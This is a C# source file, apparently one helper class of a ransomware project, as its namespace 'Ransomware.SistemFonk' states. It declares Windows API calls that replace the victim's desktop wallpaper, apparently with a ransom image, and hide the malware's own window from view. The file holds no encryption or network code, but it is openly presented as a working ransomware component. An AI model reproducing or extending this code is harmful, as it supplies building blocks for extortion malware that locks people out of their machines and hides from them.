using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace Ransomware.SistemFonk
{
    class API
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 uiAction, UInt32 uiParam, String pvParam, UInt32 fWinIni);
        private static UInt32 SPI_SETDESKWALLPAPER = 20;
        private static UInt32 SPIF_UPDATEINIFILE = 0x1;

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public static void ArkaplanDegistir(string yol)
        {
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 1, yol, SPIF_UPDATEINIFILE);
        }

        public static void EkranDurumu(bool durum)
        {
            int _durum = 1;
            if (durum)
                _durum = 0;

            ShowWindow(Process.GetCurrentProcess().MainWindowHandle, _durum);
        }

    }
}
